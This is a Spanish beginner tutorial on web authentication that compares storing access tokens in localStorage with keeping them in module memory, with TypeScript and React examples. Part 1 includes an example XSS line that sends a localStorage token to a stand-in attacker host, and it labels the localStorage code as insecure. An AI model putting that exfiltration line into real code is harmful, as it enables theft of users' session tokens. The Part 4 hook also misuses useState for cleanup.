# Ejemplo Básico: localStorage vs. Almacenamiento en Memoria

> **Nivel:** 🟢 Básico | **Tiempo estimado:** 20 minutos

---

## Objetivo

Demostrar por qué `localStorage` es inseguro para almacenar tokens y cómo migrar a almacenamiento en memoria de forma sencilla.

---

## Parte 1: El Problema con localStorage

### ❌ Implementación Insegura (NO usar en producción)

```typescript
// ❌ MAL: Guardar token en localStorage
function loginInsecure(email: string, password: string) {
  return fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  })
    .then(res => res.json())
    .then(data => {
      // ❌ PELIGRO: El token es accesible por CUALQUIER script en este origen
      localStorage.setItem('accessToken', data.accessToken);
      localStorage.setItem('user', JSON.stringify(data.user));
      return data;
    });
}

// ❌ MAL: Leer token de localStorage en cada request
function fetchUserProfile() {
  const token = localStorage.getItem('accessToken'); // ❌ Expuesto a XSS
  
  return fetch('/api/profile', {
    headers: {
      Authorization: `Bearer ${token}`,
    },
  });
}
```

### Demostración del Riesgo

Abre la consola del navegador en cualquier sitio que use esta implementación y ejecuta:

```javascript
// Cualquier script (incluyendo los de terceros) puede hacer esto:
console.log('Token robado:', localStorage.getItem('accessToken'));

// Un ataque XSS lo enviaría a un servidor malicioso:
fetch('https://atacante.com/steal?token=' + localStorage.getItem('accessToken'));
```

---

## Parte 2: Solución con Almacenamiento en Memoria

### ✅ Implementación Segura: Módulo de Token en Memoria

```typescript
// lib/token-store.ts

// La variable vive en el scope del módulo (memoria del proceso JS)
// Solo accesible desde este módulo
let _accessToken: string | null = null;

export const tokenStore = {
  set(token: string): void {
    _accessToken = token;
  },
  
  get(): string | null {
    return _accessToken;
  },
  
  clear(): void {
    _accessToken = null;
  },
  
  exists(): boolean {
    return _accessToken !== null;
  },
};

// NOTA: Si el usuario recarga la página, el token se pierde.
// Eso es intencional: se usará el refresh token (en httpOnly cookie)
// para obtener un nuevo access token automáticamente.
```

### ✅ Login Seguro con Memoria

```typescript
// services/auth.service.ts
import { tokenStore } from '../lib/token-store';

interface LoginResponse {
  accessToken: string;
  expiresIn: number;
  user: {
    id: string;
    email: string;
    name: string;
    roles: string[];
  };
}

export async function login(email: string, password: string): Promise<LoginResponse['user']> {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include', // ✅ Permite recibir cookies httpOnly del servidor
    body: JSON.stringify({ email, password }),
  });
  
  if (!response.ok) {
    throw new Error('Credenciales inválidas');
  }
  
  const data: LoginResponse = await response.json();
  
  // ✅ BIEN: Guardar access token solo en memoria
  tokenStore.set(data.accessToken);
  
  // El refresh token fue recibido automáticamente como httpOnly cookie
  // (el servidor lo establece con Set-Cookie)
  // JavaScript nunca puede leerlo — solo el navegador lo guarda y envía
  
  return data.user;
}

export async function fetchWithAuth(url: string, options: RequestInit = {}) {
  const token = tokenStore.get(); // ✅ Accede desde memoria, no desde localStorage
  
  return fetch(url, {
    ...options,
    credentials: 'include',
    headers: {
      ...options.headers,
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
  });
}

export function logout(): void {
  // ✅ Limpiar el token de memoria
  tokenStore.clear();
  
  // El servidor se encargará de eliminar la httpOnly cookie
  fetch('/api/auth/logout', {
    method: 'POST',
    credentials: 'include',
  });
}
```

---

## Parte 3: Comparación Lado a Lado

```typescript
// ─── COMPARACIÓN: localStorage vs. Memoria ───────────────────────────────

// ❌ localStorage: Persistente, accesible por XSS
localStorage.setItem('token', 'valor');
// Cualquier script puede leerlo:
// window.maliciousLib = localStorage.getItem('token');

// ✅ Memoria: Efímera, aislada del DOM
let tokenEnMemoria = 'valor';
// Solo accesible desde el módulo que lo declara
// Un script de terceros NO puede acceder a variables de módulos ES6

// ─── PRUEBA DE AISLAMIENTO ───────────────────────────────────────────────

// En la consola del navegador, intenta acceder al token en memoria:
// > tokenEnMemoria
// ReferenceError: tokenEnMemoria is not defined ✅

// Intenta acceder al token en localStorage:
// > localStorage.getItem('token')
// "valor" ❌
```

---

## Parte 4: Hook Básico de React

```tsx
// hooks/useToken.ts
import { useState, useCallback } from 'react';

// Estado compartido entre instancias del hook (patrón singleton)
let sharedToken: string | null = null;
let listeners: Array<(token: string | null) => void> = [];

function notifyListeners(token: string | null) {
  listeners.forEach(listener => listener(token));
}

export function useToken() {
  const [token, setTokenState] = useState<string | null>(sharedToken);
  
  // Registrar este componente como listener
  useState(() => {
    listeners.push(setTokenState);
    return () => {
      listeners = listeners.filter(l => l !== setTokenState);
    };
  });
  
  const setToken = useCallback((newToken: string | null) => {
    sharedToken = newToken;
    notifyListeners(newToken);
  }, []);
  
  return { token, setToken };
}

// Uso en componente:
function LoginButton() {
  const { setToken } = useToken();
  
  const handleLogin = async () => {
    const response = await fetch('/api/auth/login', { /* ... */ });
    const data = await response.json();
    setToken(data.accessToken); // ✅ Almacenado en memoria compartida
  };
  
  return <button onClick={handleLogin}>Iniciar sesión</button>;
}
```

---

## ⚠️ Advertencia sobre la Recarga de Página

```
┌──────────────────────────────────────────────────────────┐
│               ¿Qué pasa si el usuario recarga?           │
│                                                          │
│  Memoria JS: Token perdido ❌ → Renovar con RT cookie ✅  │
│  localStorage: Token persiste ✅ → Riesgo XSS ❌         │
│                                                          │
│  La pérdida de token en memoria NO es un bug — es una   │
│  característica de seguridad. El refresh token en la    │
│  httpOnly cookie permite recuperar la sesión de forma   │
│  silenciosa al recargar la página.                      │
└──────────────────────────────────────────────────────────┘
```

---

*← [Volver a la Sección 1.2](../README.md) | [→ Ejemplo Intermedio](./intermedio.md)*
